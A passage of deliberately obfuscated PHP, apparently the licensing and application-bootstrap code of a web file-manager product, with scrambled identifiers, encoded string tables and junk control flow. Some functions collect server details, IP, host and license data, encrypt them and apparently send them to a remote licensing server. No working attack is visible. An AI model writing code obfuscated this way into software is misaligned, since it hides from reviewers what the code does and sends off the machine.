Model($¶ŸºËä°[2020])->where($¼íÊ¤¹‡)->delete(); Model($¶ŸºËä°[2029])->where($¼íÊ¤¹‡)->delete(); } } goto D½Ë¯‚ÙÊ¨; EõàÉ³İé’: define($_SERVER[íïàËŸë][317], 3); define($_SERVER[íïàËŸë][318], 1); define($_SERVER[íïàËŸë][319], 0); goto bäñˆ¹õ›Î; CÍ¨¡ù×Ö‰: $_SERVER[°‡§ºŸ] = explode($_SERVER[íïàËŸë][680], gzinflate(substr($_SERVER[íïàËŸë][681], 10, -8))); $hdyvsfxmkr = $_SERVER[íïàËŸë][682]; class Application { private $defaultModule = "\x69\x6e\x64\145\170"; private $defaultController = "\x69\156\x64\145\x78"; private $defaultAction = "\x69\156\144\x65\x78"; function __construct() { } public function setDefault($Ø‰°È†ñ) { $Ù¶×åÊÏ =& $_SERVER[íïàËŸë]; $òÏû–åü =& $_SERVER[°‡§ºŸ]; $Ì’á„Õ´ = explode($òÏû–åü[0], trim($Ø‰°È†ñ, $òÏû–åü[0])); $this->defaultModule = $Ì’á„Õ´[0] ? $Ì’á„Õ´[0] : $this->defaultModule; $this->defaultController = $Ì’á„Õ´[1] ? $Ì’á„Õ´[1] : $this->defaultController; $÷ö¹ÖÓÒ = $Ù¶×åÊÏ[683]; $this->defaultAction = $Ì’á„Õ´[2] ? $Ì’á„Õ´[2] : $this->defaultAction; $ı‘ê£ü÷ = $Ù¶×åÊÏ[684]; if (!$ı‘ê£ü÷) { return; } $this->fszxae415af1($òÏû–åü[1], array($this, $òÏû–åü[2])); $Ûƒğõ = $Ù¶×åÊÏ[685]; if (strlen($Ûƒğõ) < $Ù¶×åÊÏ[686]) { die; } } public function appRun($ÌÍ‚Ñ§¯) { $Ê²’çÏ¡ =& $_SERVER[íïàËŸë]; $€™•ÕÁ =& $_SERVER[°‡§ºŸ]; $Ö—ÜÆš = explode($€™•ÕÁ[0], $ÌÍ‚Ñ§¯); $àú¢¡ú“ = strtolower($Ö—ÜÆš[0]); $éÑ¿›®º = $Ê²’çÏ¡[687]; while ($éÑ¿›®º < $Ê²’çÏ¡[686]) { if ($éÑ¿›®º >= 0) { break; } $éÑ¿›®º++; } $ûá‰ë¿ù = $€™•ÕÁ[3]; if ($àú¢¡ú“ == $€™•ÕÁ[4]) { $ûá‰ë¿ù = $€™•ÕÁ[5]; $Ö—ÜÆš[0] = $€™•ÕÁ[6]; $Ö—ÜÆš[1] = $Ö—ÜÆš[1] . $€™•ÕÁ[7]; $ÌÍ‚Ñ§¯ = join($€™•ÕÁ[0], $Ö—ÜÆš); $ÌÍ‚Ñ§¯ = trim($ÌÍ‚Ñ§¯, $€™•ÕÁ[0]); } call_user_func(array($€™•ÕÁ[8], $€™•ÕÁ[9]), $ûá‰ë¿ù . $€™•ÕÁ[10], $ÌÍ‚Ñ§¯); ActionCall($ÌÍ‚Ñ§¯); call_user_func(array($€™•ÕÁ[8], $€™•ÕÁ[9]), $ûá‰ë¿ù . $€™•ÕÁ[11], $ÌÍ‚Ñ§¯); $²ş‘«„ß = $Ê²’çÏ¡[688]; } private function autorun() { $Œ×¸·Í“ =& $_SERVER[°‡§ºŸ]; global $config; $—ç´¿¶Í = $_SERVER[íïàËŸë][689]; if (count($config[$Œ×¸·Í“[12]]) == 0) { return; } foreach ($config[$Œ×¸·Í“[12]] as $šÍ¨ØÃ => $úÎ†ãâ) { $this->appRun($úÎ†ãâ); } } private function oxpbf2454d04() { $ğè”Ò § =& $_SERVER[íïàËŸë]; $Ú’Ûµ”ï =& $_SERVER[°‡§ºŸ]; $÷£ûíä¿ = $Ú’Ûµ”ï[4]; $Àó“á÷¹ = $GLOBALS[$Ú’Ûµ”ï[13]][$Ú’Ûµ”ï[14]][0]; $ğØÈøİ… = $ğè”Ò §[690]; while ($ğØÈøİ… < $ğè”Ò §[691]) { if ($ğØÈøİ… >= 0) { break; } $ğØÈøİ…++; } if (!$Àó“á÷¹ || strlen($Àó“á÷¹) <= strlen($÷£ûíä¿)) { return; } if (strtolower(substr($Àó“á÷¹, -strlen($÷£ûíä¿))) != $÷£ûíä¿) { return; } $«·›–ï = substr($Àó“á÷¹, 0, -strlen($÷£ûíä¿)); $ˆ€õéÔ = $ğè”Ò §[692]; if (strlen($ˆ€õéÔ) < $ğè”Ò §[693]) { die; } $’ÈËÄŞ² = array($Ú’Ûµ”ï[4], $«·›–ï); $ıÅ¬õÉ = $ğè”Ò §[694]; while ($ıÅ¬õÉ < $ğè”Ò §[686]) { if ($ıÅ¬õÉ >= 0) { break; } $ıÅ¬õÉ++; } $ü‘‡¦¤ = array_slice($GLOBALS[$Ú’Ûµ”ï[13]][$Ú’Ûµ”ï[14]], 1); $GLOBALS[$Ú’Ûµ”ï[13]][$Ú’Ûµ”ï[14]] = array_merge($’ÈËÄŞ², $ü‘‡¦¤); $GLOBALS[$Ú’Ûµ”ï[13]][$Ú’Ûµ”ï[15]] = implode($Ú’Ûµ”ï[0], $GLOBALS[$Ú’Ûµ”ï[13]][$Ú’Ûµ”ï[14]]); $œÁÃ¡ı™ = $ğè”Ò §[695]; while (strlen($œÁÃ¡ı™) < $ğè”Ò §[686]) { if (!$œÁÃ¡ı™) { break; } $œÁÃ¡ı™++; } } private function gpwnbc2e7494() { $Ó¼ˆ„üÂ =& $_SERVER[íïàËŸë]; $ó÷œÀá¬ =& $_SERVER[°‡§ºŸ]; if ($GLOBALS[$ó÷œÀá¬[13]][$ó÷œÀá¬[15]] != $ó÷œÀá¬[6]) { return; } $»ÚÍ¾ä™ = $_SERVER[$ó÷œÀá¬[16]]; $‚”´ÂÔ = $ó÷œÀá¬[17]; $È˜¬å±Á = $Ó¼ˆ„üÂ[696]; if (!$È˜¬å±Á) { die; } if (!strstr($»ÚÍ¾ä™, $‚”´ÂÔ)) { return; } $šƒú¿ÈÑ = strrpos($»ÚÍ¾ä™, $‚”´ÂÔ); $äì²Ò¹é = $Ó¼ˆ„üÂ[697]; if (strlen($äì²Ò¹é) < $Ó¼ˆ„üÂ[691]) { die; } $Ÿ´¨œŒ¥ = substr($»ÚÍ¾ä™, $šƒú¿ÈÑ + strlen($‚”´ÂÔ)); preg_match_all($ó÷œÀá¬[18], $Ÿ´¨œŒ¥, $»œÂ—¿†); $Ÿ´¨œŒ¥ = trim($»œÂ—¿†[0][0], $ó÷œÀá¬[19]); $GLOBALS[$ó÷œÀá¬[13]][$ó÷œÀá¬[14]] = explode($ó÷œÀá¬[19], $Ÿ´¨œŒ¥); $ŠšÑ££é = $Ó¼ˆ„üÂ[698]; if (strlen($ŠšÑ££é) < $Ó¼ˆ„üÂ[691]) { die; } $GLOBALS[$ó÷œÀá¬[13]][$ó÷œÀá¬[15]] = implode($ó÷œÀá¬[0], $GLOBALS[$ó÷œÀá¬[13]][$ó÷œÀá¬[14]]); $Šä›ºâ = $Ó¼ˆ„üÂ[699]; while (strlen($Šä›ºâ) < $Ó¼ˆ„üÂ[693]) { if (!$Šä›ºâ) { break; } $Šä›ºâ++; } } public function run() { $Ä‚˜Ôò =& $_SERVER[íïàËŸë]; $ó»°óŠ =& $_SERVER[°‡§ºŸ]; $this->gpwnbc2e7494(); $this->oxpbf2454d04(); $´¡»Üò– = $Ä‚˜Ôò[700]; while (strlen($´¡»Üò–) < $Ä‚˜Ôò[686]) { if (!$´¡»Üò–) { break; } $´¡»Üò–++; } $İö°®‚ = $GLOBALS[$ó»°óŠ[13]][$ó»°óŠ[14]]; $”øÀ´Ô” = $GLOBALS[$ó»°óŠ[13]][$ó»°óŠ[15]]; $İ£Œ÷‘« = $Ä‚˜Ôò[701]; while (strlen($İ£Œ÷‘«) < $Ä‚˜Ôò[702]) { if (!$İ£Œ÷‘«) { break; } $İ£Œ÷‘«++; } define($ó»°óŠ[20], isset($İö°®‚[0]) && $İö°®‚[0] ? $İö°®‚[0] : $this->defaultModule); $È³É•—Â = $Ä‚˜Ôò[703]; define($ó»°óŠ[21], isset($İö°®‚[1]) && $İö°®‚[0] ? $İö°®‚[1] : $this->defaultController); define($ó»°óŠ[22], isset($İö°®‚[2]) && $İö°®‚[0] ? $İö°®‚[2] : $this->defaultAction); $§å›¶’™ = $Ä‚˜Ôò[704]; while ($§å›¶’™ < $Ä‚˜Ôò[691]) { if ($§å›¶’™ >= 0) { break; } $§å›¶’™++; } define($ó»°óŠ[23], MOD . $ó»°óŠ[0] . ST . $ó»°óŠ[0] . ACT); $_SERVER[$ó»°óŠ[24]] = strtolower(ACTION); $ÊÊ¢  = $Ä‚˜Ôò[705]; while (strlen($ÊÊ¢ ) < $Ä‚˜Ôò[702]) { if (!$ÊÊ¢ ) { break; } $ÊÊ¢ ++; } $this->autorun(); if (count($İö°®‚) >= 3) { $this->appRun($”øÀ´Ô”); } else { $this->appRun(ACTION); } } private $mhiq3786b99e = array(); private $khem6d4b077e = ''; public function wrdxabb8dcff() { $–ÍĞ‰ƒ¥ =& $_SERVER[íïàËŸë]; $¥Œğûï¸ =& $_SERVER[°‡§ºŸ]; $this->kjrq63a9a15f(); $this->kohvbb27436c(); $¬ùí÷® = $–ÍĞ‰ƒ¥[706]; if (!$¬ùí÷®) { return; } $this->jnkeec68eab4(); $‡Á¡å¤ = $–ÍĞ‰ƒ¥[707]; if (!$‡Á¡å¤) { return; } $this->mbdgfedcf9eb(); $•ÒŸ±·¢ = $–ÍĞ‰ƒ¥[708]; if (strlen($•ÒŸ±·¢) < $–ÍĞ‰ƒ¥[686]) { die; } $this->ztwg076b6fea(); $Ì²Üªğç = $–ÍĞ‰ƒ¥[709]; while (strlen($Ì²Üªğç) < $–ÍĞ‰ƒ¥[710]) { if (!$Ì²Üªğç) { break; } $Ì²Üªğç++; } $this->bzxh6772ea08(); $this->dyajdd563227(); $úõş–µ = $–ÍĞ‰ƒ¥[711]; if (strlen($úõş–µ) < $–ÍĞ‰ƒ¥[710]) { return; } $this->fszxae415af1($¥Œğûï¸[25], array($this, $¥Œğûï¸[26])); $ƒÉœŞú = $–ÍĞ‰ƒ¥[712]; $this->fszxae415af1($¥Œğûï¸[27], array($this, $¥Œğûï¸[28])); $this->fszxae415af1($¥Œğûï¸[29], array($this, $¥Œğûï¸[30])); $this->fszxae415af1($¥Œğûï¸[31], array($this, $¥Œğûï¸[32])); $”¨ø¥š = $–ÍĞ‰ƒ¥[713]; while ($”¨ø¥š < $–ÍĞ‰ƒ¥[710]) { if ($”¨ø¥š >= 0) { break; } $”¨ø¥š++; } } public function xdes6dcbac84($“›ñ¯—Ü) { $õŒä‡ç¬ =& $_SERVER[íïàËŸë]; $§è÷£ÄŸ =& $_SERVER[°‡§ºŸ]; $½Èğİ¿ü = Model($§è÷£ÄŸ[33])->get(); $ù®ø¦¢Œ = $õŒä‡ç¬[714]; if (strlen($ù®ø¦¢Œ) < $õŒä‡ç¬[691]) { die; } $’Ë¼ˆ½ = array($§è÷£ÄŸ[34], $§è÷£ÄŸ[35], $§è÷£ÄŸ[36], $§è÷£ÄŸ[37], $§è÷£ÄŸ[38], $§è÷£ÄŸ[39], $§è÷£ÄŸ[40], $§è÷£ÄŸ[41], $§è÷£ÄŸ[42], $§è÷£ÄŸ[43], $§è÷£ÄŸ[44], $§è÷£ÄŸ[45], $§è÷£ÄŸ[46], $§è÷£ÄŸ[47], $§è÷£ÄŸ[48], $§è÷£ÄŸ[49], $§è÷£ÄŸ[50], $§è÷£ÄŸ[51], $§è÷£ÄŸ[52], $§è÷£ÄŸ[53], $§è÷£ÄŸ[54], $§è÷£ÄŸ[55], $§è÷£ÄŸ[56], $§è÷£ÄŸ[57], $§è÷£ÄŸ[58], $§è÷£ÄŸ[59], $§è÷£ÄŸ[60], $§è÷£ÄŸ[61], $§è÷£ÄŸ[62], $§è÷£ÄŸ[63], $§è÷£ÄŸ[64], $§è÷£ÄŸ[65], $§è÷£ÄŸ[66], $§è÷£ÄŸ[67], $§è÷£ÄŸ[68], $§è÷£ÄŸ[69], $§è÷£ÄŸ[70], $§è÷£ÄŸ[71], $§è÷£ÄŸ[72], $§è÷£ÄŸ[73], $§è÷£ÄŸ[74], $§è÷£ÄŸ[75], $§è÷£ÄŸ[76], $§è÷£ÄŸ[77], $§è÷£ÄŸ[78], $§è÷£ÄŸ[79], $§è÷£ÄŸ[80], $§è÷£ÄŸ[81], $§è÷£ÄŸ[82], $§è÷£ÄŸ[83], $§è÷£ÄŸ[84], $§è÷£ÄŸ[85]); foreach ($’Ë¼ˆ½ as $ˆÀªœ›â) { $¼í›Èˆ– = $GLOBALS[$§è÷£ÄŸ[86]][$§è÷£ÄŸ[87]][$ˆÀªœ›â]; $©áåÕğ˜ = $õŒä‡ç¬[715]; if (!$©áåÕğ˜) { return; } if (isset($½Èğİ¿ü[$ˆÀªœ›â])) { $¼í›Èˆ– = $½Èğİ¿ü[$ˆÀªœ›â]; } $“›ñ¯—Ü[$§è÷£ÄŸ[88]][$§è÷£ÄŸ[89]][$ˆÀªœ›â] = $¼í›Èˆ–; } $à©¿â£Š = $“›ñ¯—Ü[$§è÷£ÄŸ[88]][$§è÷£ÄŸ[89]][$§è÷£ÄŸ[46]]; unset($“›ñ¯—Ü[$§è÷£ÄŸ[88]][$§è÷£ÄŸ[90]][$§è÷£ÄŸ[91]]); $åìª» = $õŒä‡ç¬[716]; if (!$åìª») { die; } unset($“›ñ¯—Ü[$§è÷£ÄŸ[88]][$§è÷£ÄŸ[90]][$§è÷£ÄŸ[92]]); $¤—±ú¦ = $õŒä‡ç¬[717]; if (strlen($¤—±ú¦) < $õŒä‡ç¬[710]) { die; } unset($“›ñ¯—Ü[$§è÷£ÄŸ[88]][$§è÷£ÄŸ[89]][$§è÷£ÄŸ[46]]); $‘‡×°ï… = $õŒä‡ç¬[718]; unset($“›ñ¯—Ü[$§è÷£ÄŸ[88]][$§è÷£ÄŸ[89]][$§è÷£ÄŸ[93]]); $“›ñ¯—Ü[$§è÷£ÄŸ[88]][$§è÷£ÄŸ[89]][$§è÷£ÄŸ[94]] = array($§è÷£ÄŸ[95] => (int) $à©¿â£Š[$§è÷£ÄŸ[96]], $§è÷£ÄŸ[97] => (int) _get($à©¿â£Š, $§è÷£ÄŸ[98], 0)); $¦Ë’–Ó = substr(md5($§è÷£ÄŸ[99] . get_client_ip() . $½Èğİ¿ü[$§è÷£ÄŸ[100]]), 0, 15); $“›ñ¯—Ü[$§è÷£ÄŸ[101]][$§è÷£ÄŸ[102]] = Mcrypt::encode(Session::sign(), $¦Ë’–Ó, 3600 * 24); $“›ñ¯—Ü[$§è÷£ÄŸ[101]][$§è÷£ÄŸ[103]] = Action($§è÷£ÄŸ[104])->accessToken(); $“›ñ¯—Ü[$§è÷£ÄŸ[101]][$§è÷£ÄŸ[105]] = md5($_SERVER[$§è÷£ÄŸ[106]] . $½Èğİ¿ü[$§è÷£ÄŸ[100]]); $“›ñ¯—Ü[$§è÷£ÄŸ[101]][$§è÷£ÄŸ[107]] = base64_encode(serverInfo()); $“›ñ¯—Ü[$§è÷£ÄŸ[101]][$§è÷£ÄŸ[108]] = $this->khem6d4b077e; $Ó€Í†šß = $õŒä‡ç¬[719]; if (!$Ó€Í†šß) { return; } if ($½Èğİ¿ü[$§è÷£ÄŸ[108]] != $§è÷£ÄŸ[109]) { $“›ñ¯—Ü[$§è÷£ÄŸ[101]][$§è÷£ÄŸ[110]] = $½Èğİ¿ü[$§è÷£ÄŸ[110]]; $“›ñ¯—Ü[$§è÷£ÄŸ[101]][$§è÷£ÄŸ[111]] = $½Èğİ¿ü[$§è÷£ÄŸ[111]]; $•Ü…™€ = rand_string(10) . $this->khem6d4b077e . rand_string(5); $“›ñ¯—Ü[$§è÷£ÄŸ[88]][$§è÷£ÄŸ[112]][$§è÷£ÄŸ[113]] = $this->qogu89ea2845($•Ü…™€, $“›ñ¯—Ü[$§è÷£ÄŸ[101]][$§è÷£ÄŸ[105]]); } if ($this->khem6d4b077e == $§è÷£ÄŸ[109]) { $“›ñ¯—Ü[$§è÷£ÄŸ[88]][$§è÷£ÄŸ[89]][$§è÷£ÄŸ[94]][$§è÷£ÄŸ[98]] = 0; } $“›ñ¯—Ü[$§è÷£ÄŸ[101]][$§è÷£ÄŸ[114]] = $this->versionPluginFilter(); $“›ñ¯—Ü[$§è÷£ÄŸ[101]][$§è÷£ÄŸ[115]] = _get($this->mhiq3786b99e, $§è÷£ÄŸ[116], $§è÷£ÄŸ[6]); if (KodUser::isRoot() && $this->config[$§è÷£ÄŸ[117]]) { $“›ñ¯—Ü[$§è÷£ÄŸ[101]][$§è÷£ÄŸ[118]] = WEB_ROOT; } return $“›ñ¯—Ü; } private function bzxh6772ea08() { $¦°ÌúüŒ =& $_SERVER[íïàËŸë]; $š…”ğß¸ =& $_SERVER[°‡§ºŸ]; $·âÌê©Ÿ = $_SERVER[$š…”ğß¸[24]] == $š…”ğß¸[119]; if ($_SERVER[$š…”ğß¸[24]] == $š…”ğß¸[120] && $_GET[$š…”ğß¸[121]] == $š…”ğß¸[122]) { $·âÌê©Ÿ = !0; } if ($·âÌê©Ÿ) { $Ò¹Í™¨ê = array($š…”ğß¸[108] => $this->khem6d4b077e, $š…”ğß¸[123] => $this->kewm615b272f(), $š…”ğß¸[124] => Model($š…”ğß¸[125])->count()); if ($this->khem6d4b077e != $š…”ğß¸[109]) { $€¹ŒùÒ¬ = _get($this->mhiq3786b99e, $š…”ğß¸[126]); if ($€¹ŒùÒ¬) { $Ò¹Í™¨ê[$š…”ğß¸[127]] = $€¹ŒùÒ¬; $Ò¹Í™¨ê[$š…”ğß¸[128]] = strtotime(_get($this->mhiq3786b99e, $š…”ğß¸[129])); $Ò¹Í™¨ê[$š…”ğß¸[130]] = _get($this->mhiq3786b99e, $š…”ğß¸[116]); } $¯Áâ…ÇÀ = Model($š…”ğß¸[33])->get($š…”ğß¸[131], $š…”ğß¸[6], !0); if (is_string($¯Áâ…ÇÀ) && substr($¯Áâ…ÇÀ, 0, 1) == $š…”ğß¸[132]) { $¯Áâ…ÇÀ = json_decode_force($¯Áâ…ÇÀ); } if (is_array($¯Áâ…ÇÀ) && $¯Áâ…ÇÀ[$š…”ğß¸[133]] && strstr($¯Áâ…ÇÀ[$š…”ğß¸[133]], $š…”ğß¸[134])) { $Úü‹ÀùÛ = explode($š…”ğß¸[134], $¯Áâ…ÇÀ[$š…”ğß¸[133]]); $Ò¹Í™¨ê[$š…”ğß¸[135]] = $Úü‹ÀùÛ[0]; } } $Ò¹Í™¨ê = $this->qtsn703f7da1(json_encode($Ò¹Í™¨ê), md5($š…”ğß¸[136])); $³µòË˜– = array($š…”ğß¸[137] => $Ò¹Í™¨ê); call_user_func(array($š…”ğß¸[138], $š…”ğß¸[139]), $³µòË˜–); $Ì‹§ª› = $¦°ÌúüŒ[720]; if (!$Ì‹§ª›) { return; } } if ($this->khem6d4b077e == $š…”ğß¸[109]) { return; } $ğ„èÀÊŠ = array($š…”ğß¸[140], $š…”ğß¸[141], $š…”ğß¸[142], $š…”ğß¸[143], $š…”ğß¸[144], $š…”ğß¸[145]); $©¦¼ÒÀÉ = $¦°ÌúüŒ[721]; if (strlen($©¦¼ÒÀÉ) < $¦°ÌúüŒ[691]) { die; } $İ…ŠÌ»À = Model($š…”ğß¸[33])->get(); $³µòË˜– = array($š…”ğß¸[146] => $İ…ŠÌ»À[$š…”ğß¸[34]], $š…”ğß¸[147] => $İ…ŠÌ»À[$š…”ğß¸[35]], $š…”ğß¸[148] => $š…”ğß¸[6]); $‰úÃĞğí = $¦°ÌúüŒ[722]; if (strlen($‰úÃĞğí) < $¦°ÌúüŒ[691]) { return; } foreach ($ğ„èÀÊŠ as $Öæê×½) { if (!isset($İ…ŠÌ»À[$Öæê×½]) || !$İ…ŠÌ»À[$Öæê×½]) { continue; } $³µòË˜–[$Öæê×½] = $İ…ŠÌ»À[$Öæê×½]; $ô³ÔÓìê = $¦°ÌúüŒ[723]; } call_user_func(array($š…”ğß¸[138], $š…”ğß¸[139]), $³µòË˜–); $ƒŸã‚ê = $¦°ÌúüŒ[724]; while ($ƒŸã‚ê < $¦°ÌúüŒ[686]) { if ($ƒŸã‚ê >= 0) { break; } $ƒŸã‚ê++; } } private function mbdgfedcf9eb() { $¾ˆÔîÂ§ =& $_SERVER[íïàËŸë]; $€»¿±‰± =& $_SERVER[°‡§ºŸ]; if ($_SERVER[$€»¿±‰±[24]] != $€»¿±‰±[149]) { return; } if (!KodUser::isRoot()) { die; } $¶ŒÀÀİÙ = $GLOBALS[$€»¿±‰±[13]]; if (isset($¶ŒÀÀİÙ[$€»¿±‰±[150]])) { $this->qgwhb4d0a2d3(); die; } if (isset($¶ŒÀÀİÙ[$€»¿±‰±[151]]) && isset($¶ŒÀÀİÙ[$€»¿±‰±[151]]) == $€»¿±‰±[122]) { $¶ŒÀÀİÙ[$€»¿±‰±[152]] = Model($€»¿±‰±[33])->get($€»¿±‰±[153]); } if (!isset($¶ŒÀÀİÙ[$€»¿±‰±[152]]) || strlen($¶ŒÀÀİÙ[$€»¿±‰±[152]]) != 16) { show_json($€»¿±‰±[154] . $¶ŒÀÀİÙ[$€»¿±‰±[152]], !1); } $€î¦÷â = Model($€»¿±‰±[33])->get($€»¿±‰±[100]); $Ìƒí¯ó‡ = md5($_SERVER[$€»¿±‰±[106]] . $€î¦÷â); $À¦œ›†Š = $¾ˆÔîÂ§[725]; while ($À¦œ›†Š < $¾ˆÔîÂ§[710]) { if ($À¦œ›†Š >= 0) { break; } $À¦œ›†Š++; } $Ûö«Š§ = array($€»¿±‰±[152] => $¶ŒÀÀİÙ[$€»¿±‰±[152]], $€»¿±‰±[155] => rand_string(16), $€»¿±‰±[156] => $€»¿±‰±[136], $€»¿±‰±[157] => $€»¿±‰±[158], $€»¿±‰±[159] => $_SERVER[$€»¿±‰±[160]], $€»¿±‰±[161] => $_SERVER[$€»¿±‰±[162]], $€»¿±‰±[163] => $_SERVER[$€»¿±‰±[164]], $€»¿±‰±[105] => $Ìƒí¯ó‡, $€»¿±‰±[165] => Model($€»¿±‰±[33])->get($€»¿±‰±[131])); if (isset($¶ŒÀÀİÙ[$€»¿±‰±[151]]) && isset($¶ŒÀÀİÙ[$€»¿±‰±[151]]) == $€»¿±‰±[122]) { $Ûö«Š§[$€»¿±‰±[151]] = md5($Ûö«Š§[$€»¿±‰±[152]] . $€»¿±‰±[166] . $Ûö«Š§[$€»¿±‰±[155]]); } if ($¶ŒÀÀİÙ[$€»¿±‰±[167]] == $€»¿±‰±[168]) { $–¹–Ë³ = $this->qtsn703f7da1($Ìƒí¯ó‡, $€»¿±‰±[169]); $õŸéâÈğ = $this->qogu89ea2845(json_encode($Ûö«Š§), $Ìƒí¯ó‡ . $€»¿±‰±[170], 3); $õŸéâÈğ = $õŸéâÈğ . $€»¿±‰±[171] . $_SERVER[$€»¿±‰±[160]]; $¦Ğ†óµô = $this->vbrwbff3e95c($€»¿±‰±[172] . $–¹–Ë³ . $€»¿±‰±[173] . $õŸéâÈğ, -1); show_json($¦Ğ†óµô, !0); } else { if ($¶ŒÀÀİÙ[$€»¿±‰±[167]] == $€»¿±‰±[174]) { $æõÔ²®õ = substr(md5($€»¿±‰±[175] . $Ìƒí¯ó‡), 12, 15) . $€»¿±‰±[176]; $õŸéâÈğ = $this->doyj15627280(trim($¶ŒÀÀİÙ[$€»¿±‰±[177]]), $æõÔ²®õ, 2); $ßÂë®“ = json_decode($õŸéâÈğ, !0); if (!is_array($ßÂë®“) || !is_array($ßÂë®“[$€»¿±‰±[178]]) || $ßÂë®“[$€»¿±‰±[152]] != !0) { $“¦àÈÖ£ = $€»¿±‰±[179]; $ğÕˆÍÔñ = $ßÂë®“[$€»¿±‰±[178]] ? $€»¿±‰±[180] . $ßÂë®“[$€»¿±‰±[178]] : $“¦àÈÖ£; show_json($ğÕˆÍÔñ, !1); } else { $Ûö«Š§[$€»¿±‰±[155]] = $ßÂë®“[$€»¿±‰±[178]][$€»¿±‰±[181]]; } } else { $ßÂë®“ = $this->vbrwbff3e95c($€»¿±‰±[182], $Ûö«Š§, 10); } } if (!is_array($ßÂë®“) || !is_array($ßÂë®“[$€»¿±‰±[178]]) || $ßÂë®“[$€»¿±‰±[152]] != !0) { $“¦àÈÖ£ = LNG($€»¿±‰±[183]); $ğÕˆÍÔñ = $ßÂë®“[$€»¿±‰±[178]] ? $€»¿±‰±[180] . $ßÂë®“[$€»¿±‰±[178]] : $“¦àÈÖ£; show_json($ğÕˆÍÔñ, !1); } $ÌòµÜ÷¾ = $ßÂë®“[$€»¿±‰±[178]]; $ØÈÂÙÕ = $this->kcbmb8d5ff68($ÌòµÜ÷¾[$€»¿±‰±[184]]); $ç¾‹äë = $¾ˆÔîÂ§[726]; if (strlen($ç¾‹äë) < $¾ˆÔîÂ§[710]) { die; } if (!$ØÈÂÙÕ || $ØÈÂÙÕ != $ÌòµÜ÷¾[$€»¿±‰±[129]]) { $ô‡¾Ë½² = array($€»¿±‰±[185] => Model($€»¿±‰±[33])->get($€»¿±‰±[100]), $€»¿±‰±[186] => $_SERVER[$€»¿±‰±[106]], $€»¿±‰±[187] => this_url(), $€»¿±‰±[161] => $_SERVER[$€»¿±‰±[162]]); $õŸéâÈğ = $this->oawzf413941f(json_encode($ô‡¾Ë½²)); $this->vbrwbff3e95c($€»¿±‰±[188] . $õŸéâÈğ); show_json(LNG($€»¿±‰±[189]), !0); } $ºË¸‹£ö = array($€»¿±‰±[153] => $ÌòµÜ÷¾[$€»¿±‰±[190]], $€»¿±‰±[191] => $ÌòµÜ÷¾[$€»¿±‰±[192]], $€»¿±‰±[193] => rand_string(16), $€»¿±‰±[108] => $ÌòµÜ÷¾[$€»¿±‰±[194]]); if ($Ûö«Š§[$€»¿±‰±[155]]) { $ºË¸‹£ö[$€»¿±‰±[193]] = $Ûö«Š§[$€»¿±‰±[155]]; } $÷ƒ®åïÌ = substr(md5($ºË¸‹£ö[$€»¿±‰±[191]]), 10, 10); $ºÓÁÕ… = $÷ƒ®åïÌ . $ºË¸‹£ö[$€»¿±‰±[108]] . $ºË¸‹£ö[$€»¿±‰±[193]]; $´Ü—ÛÏ† = $¾ˆÔîÂ§[727]; if (!$´Ü—ÛÏ†) { die; } $ºË¸‹£ö[$€»¿±‰±[110]] = strrev(base64_encode($this->qtsn703f7da1($ºÓÁÕ…, $€»¿±‰±[195]))); $â‹«Ö™ã = $¾ˆÔîÂ§[728]; if (strlen($â‹«Ö™ã) < $¾ˆÔîÂ§[693]) { return; } $Şá’ôÑï = rand_string(16); $¶ªÚÎ‹ = $Şá’ôÑï . $ºË¸‹£ö[$€»¿±‰±[108]] . $this->qtsn703f7da1(md5($ºË¸‹£ö[$€»¿±‰±[153]]), $Şá’ôÑï); $ÂøÄóÛÉ = $¾ˆÔîÂ§[729]; if (!$ÂøÄóÛÉ) { return; } $ºË¸‹£ö[$€»¿±‰±[111]] = base64_encode(strrev($this->qtsn703f7da1($¶ªÚÎ‹, $€»¿±‰±[196]))); if ($ÌòµÜ÷¾[$€»¿±‰±[197]] && $ÌòµÜ÷¾[$€»¿±‰±[197]] >= 1) { Model($€»¿±‰±[33])->setDeep($€»¿±‰±[198], $€»¿±‰±[122]); } Model($€»¿±‰±[33])->set($ºË¸‹£ö); $Õü´ó¸ = md5($_SERVER[$€»¿±‰±[106]] . strrev($€î¦÷â) . $ºË¸‹£ö[$€»¿±‰±[191]]); $–Ç¦êÈ = $¾ˆÔîÂ§[730]; if (strlen($–Ç¦êÈ) < $¾ˆÔîÂ§[710]) { die; } $Í İÓ±× = strrev(substr($Õü´ó¸, 10, 16)); $ó×÷ş = $¾ˆÔîÂ§[731]; $¹ÆüäÒñ = $this->qogu89ea2845(json_encode($ÌòµÜ÷¾), $Õü´ó¸); $³²¹›­‹ = array_to_keyvalue(Model($€»¿±‰±[7])->listData(), $€»¿±‰±[199]); $ÏÏ˜ßË“ = $³²¹›­‹[$€»¿±‰±[200]]; $¨à§£¨Ù = array(); $‹¹Æ—ñÇ = $¾ˆÔîÂ§[732]; $¨à§£¨Ù[$Í İÓ±×] = $¹ÆüäÒñ; Model($€»¿±‰±[7])->update($ÏÏ˜ßË“[$€»¿±‰±[201]], array($€»¿±‰±[202] => $¨à§£¨Ù)); $”ñ®Îğ­ = $¾ˆÔîÂ§[733]; $this->mhiq3786b99e = $ÌòµÜ÷¾; $™òµ‰ÃÅ = $¾ˆÔîÂ§[734]; $this->khem6d4b077e = $ºË¸‹£ö[$€»¿±‰±[108]]; $…Í³’¦Î = $¾ˆÔîÂ§[735]; if (strlen($…Í³’¦Î) < $¾ˆÔîÂ§[693]) { return; } $this->licenseRegistSuccess(); $Öí¦½“å = $¾ˆÔîÂ§[736]; if (strlen($Öí¦½“å) < $¾ˆÔîÂ§[693]) { return; } Cache::set($€»¿±‰±[203] . md5($€î¦÷â . $€»¿±‰±[204]), $€»¿±‰±[6]); $İ³Ùú¼ = $¾ˆÔîÂ§[737]; show_json(LNG($€»¿±‰±[189]), !0); $Å×‚âÍ = $¾ˆÔîÂ§[738]; if (!$Å×‚âÍ) { die; } } private function licenseRegistSuccess() { $«ØÓ°Ê =& $_SERVER[íïàËŸë]; $˜Š‚ı±ş =& $_SERVER[°‡§ºŸ]; $¸÷Ó’„² = Model($˜Š‚ı±ş[33])->get(); $ˆ¥ã„ = $«ØÓ°Ê[739]; if (strlen($ˆ¥ã„) < $«ØÓ°Ê[702]) { die; } if ($¸÷Ó’„²[$˜Š‚ı±ş[63]] != $˜Š‚ı±ş[122]) { Model($˜Š‚ı±ş[33])->set($˜Š‚ı±ş[63], $˜Š‚ı±ş[122]); } Action($˜Š‚ı±ş[205])->initStart(!0); } private function qgwhb4d0a2d3() { $ ¼ŸãØ =& $_SERVER[°‡§ºŸ]; Model($ ¼ŸãØ[33])->set(array($ 